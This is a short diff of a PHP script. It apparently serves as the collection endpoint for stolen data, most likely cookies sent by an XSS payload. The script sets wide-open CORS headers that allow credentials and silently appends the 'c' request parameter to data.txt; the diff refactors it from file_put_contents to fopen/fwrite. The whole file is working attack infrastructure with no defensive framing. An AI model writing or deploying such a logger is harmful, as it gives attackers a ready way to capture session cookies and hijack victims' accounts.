@@ -8,14 +8,10 @@ header('Access-Control-Allow-Credentials: true');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Headers: Content-Type, *');
 
-$file = 'data.txt';
-
-if(isset($_REQUEST['c']) && !empty($_REQUEST['c']))
-{
-	file_put_contents($file, $_REQUEST['c'], FILE_APPEND);
-	printf("LOGGED!");
+if(!empty($_GET['c'])) {
+    $logfile = fopen('data.txt', 'a+');
+    fwrite($logfile, $_GET['c']);
+    fclose($logfile);
 }
-
-?>
 
 </html>
